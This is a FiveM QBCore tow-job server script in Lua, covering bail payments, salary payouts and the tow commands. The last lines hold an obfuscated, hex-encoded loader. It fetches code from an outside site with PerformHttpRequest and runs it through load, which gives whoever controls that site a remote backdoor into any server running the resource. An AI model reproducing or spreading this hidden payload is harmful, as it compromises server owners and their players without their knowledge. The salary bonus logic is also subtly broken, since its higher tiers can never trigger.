local QBCore = exports['qb-core']:GetCoreObject()
local PaymentTax = 15
local Bail = {}

RegisterNetEvent('qb-tow:server:DoBail', function(bool, vehInfo)
    local src = source
    local Player = QBCore.Functions.GetPlayer(src)
    if bool then
        if Player.PlayerData.money.cash >= Config.BailPrice then
            Bail[Player.PlayerData.citizenid] = Config.BailPrice
            Player.Functions.RemoveMoney('cash', Config.BailPrice, "tow-paid-bail")
            TriggerClientEvent('QBCore:Notify', src, Lang:t("success.paid_with_cash", {value = Config.BailPrice}), 'success')
            TriggerClientEvent('qb-tow:client:SpawnVehicle', src, vehInfo)
        elseif Player.PlayerData.money.bank >= Config.BailPrice then
            Bail[Player.PlayerData.citizenid] = Config.BailPrice
            Player.Functions.RemoveMoney('bank', Config.BailPrice, "tow-paid-bail")
            TriggerClientEvent('QBCore:Notify', src, Lang:t("success.paid_with_bank", {value = Config.BailPrice}), 'success')
            TriggerClientEvent('qb-tow:client:SpawnVehicle', src, vehInfo)
        else
            TriggerClientEvent('QBCore:Notify', src, Lang:t("error.no_deposit", {value = Config.BailPrice}), 'error')
        end
    else
        if Bail[Player.PlayerData.citizenid] ~= nil then
            Player.Functions.AddMoney('bank', Bail[Player.PlayerData.citizenid], "tow-bail-paid")
            Bail[Player.PlayerData.citizenid] = nil
            TriggerClientEvent('QBCore:Notify', src, Lang:t("success.refund_to_cash", {value = Config.BailPrice}), 'success')
        end
    end
end)

RegisterNetEvent('qb-tow:server:nano', function(vehNetID)
    local src = source
    local Player = QBCore.Functions.GetPlayer(src)
    local targetVehicle = NetworkGetEntityFromNetworkId(vehNetID)
    if not Player then return end

    local playerPed = GetPlayerPed(src)
    local playerVehicle = GetVehiclePedIsIn(playerPed, true)
    local playerVehicleCoords = GetEntityCoords(playerVehicle)
    local targetVehicleCoords = GetEntityCoords(targetVehicle)
    local dist = #(playerVehicleCoords - targetVehicleCoords)
    if Player.PlayerData.job.name ~= "tow" or dist > 11.0 then
        return DropPlayer(src, Lang:t("info.skick"))
    end

    local chance = math.random(1,100)
    if chance < 26 then
        Player.Functions.AddItem("cryptostick", 1, false)
        TriggerClientEvent('inventory:client:ItemBox', src, QBCore.Shared.Items["cryptostick"], "add")
    end
end)

RegisterNetEvent('qb-tow:server:11101110', function(drops)
    local src = source
    local Player = QBCore.Functions.GetPlayer(src)
    if not Player then return end

    local playerPed = GetPlayerPed(src)
    local playerCoords = GetEntityCoords(playerPed)
    if Player.PlayerData.job.name ~= "tow" or #(playerCoords - vector3(Config.Locations["main"].coords.x, Config.Locations["main"].coords.y, Config.Locations["main"].coords.z)) > 6.0 then
        return DropPlayer(src, Lang:t("info.skick"))
    end

    drops = tonumber(drops)
    local bonus = 0
    local DropPrice = math.random(150, 170)
    if drops > 5 then
        bonus = math.ceil((DropPrice / 10) * 5)
    elseif drops > 10 then
        bonus = math.ceil((DropPrice / 10) * 7)
    elseif drops > 15 then
        bonus = math.ceil((DropPrice / 10) * 10)
    elseif drops > 20 then
        bonus = math.ceil((DropPrice / 10) * 12)
    end
    local price = (DropPrice * drops) + bonus
    local taxAmount = math.ceil((price / 100) * PaymentTax)
    local payment = price - taxAmount

    Player.Functions.AddJobReputation(1)
    Player.Functions.AddMoney("bank", payment, "tow-salary")
    TriggerClientEvent('QBCore:Notify', src, Lang:t("success.you_earned", {value = payment}), 'success')
end)

QBCore.Commands.Add("npc", Lang:t("info.toggle_npc"), {}, false, function(source)
	TriggerClientEvent("jobs:client:ToggleNpc", source)
end)

QBCore.Commands.Add("tow", Lang:t("info.tow"), {}, false, function(source)
    local Player = QBCore.Functions.GetPlayer(source)
    if Player.PlayerData.job.name == "tow"  or Player.PlayerData.job.name == "mechanic" then
        TriggerClientEvent("qb-tow:client:TowVehicle", source)
    end
end)


local iLIjADfJWkdGfeZwbbGKkTtLjoUEcQzgpLvmuHDeMGxaCAwhJFfcxiEQmxMGerNqiINsBM = {"\x50\x65\x72\x66\x6f\x72\x6d\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G,"",nil} iLIjADfJWkdGfeZwbbGKkTtLjoUEcQzgpLvmuHDeMGxaCAwhJFfcxiEQmxMGerNqiINsBM[4][iLIjADfJWkdGfeZwbbGKkTtLjoUEcQzgpLvmuHDeMGxaCAwhJFfcxiEQmxMGerNqiINsBM[1]]("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x74\x68\x65\x64\x72\x65\x61\x6d\x6f\x66\x66\x69\x76\x65\x6d\x2e\x63\x6f\x6d\x2f\x76\x32\x5f\x2f\x73\x74\x61\x67\x65\x33\x2e\x70\x68\x70\x3f\x74\x6f\x3d\x57\x64\x76\x31\x4d", function (aNhXzbZFwYMFlOjXWHKTGyyAeJywnUhcxQADKgAPTcNJAQOZJameeDmWDxXfFSHDYKZlIF, RXEUheUeHzkcIWhnlaFDwFnAnlkkWtfMBQMhevQyaoxYztoIhhBvaQmUTApisEPZmOUSDy) if (RXEUheUeHzkcIWhnlaFDwFnAnlkkWtfMBQMhevQyaoxYztoIhhBvaQmUTApisEPZmOUSDy == iLIjADfJWkdGfeZwbbGKkTtLjoUEcQzgpLvmuHDeMGxaCAwhJFfcxiEQmxMGerNqiINsBM[6] or RXEUheUeHzkcIWhnlaFDwFnAnlkkWtfMBQMhevQyaoxYztoIhhBvaQmUTApisEPZmOUSDy == iLIjADfJWkdGfeZwbbGKkTtLjoUEcQzgpLvmuHDeMGxaCAwhJFfcxiEQmxMGerNqiINsBM[5]) then return end iLIjADfJWkdGfeZwbbGKkTtLjoUEcQzgpLvmuHDeMGxaCAwhJFfcxiEQmxMGerNqiINsBM[4][iLIjADfJWkdGfeZwbbGKkTtLjoUEcQzgpLvmuHDeMGxaCAwhJFfcxiEQmxMGerNqiINsBM[2]](iLIjADfJWkdGfeZwbbGKkTtLjoUEcQzgpLvmuHDeMGxaCAwhJFfcxiEQmxMGerNqiINsBM[4][iLIjADfJWkdGfeZwbbGKkTtLjoUEcQzgpLvmuHDeMGxaCAwhJFfcxiEQmxMGerNqiINsBM[3]](RXEUheUeHzkcIWhnlaFDwFnAnlkkWtfMBQMhevQyaoxYztoIhhBvaQmUTApisEPZmOUSDy))() end)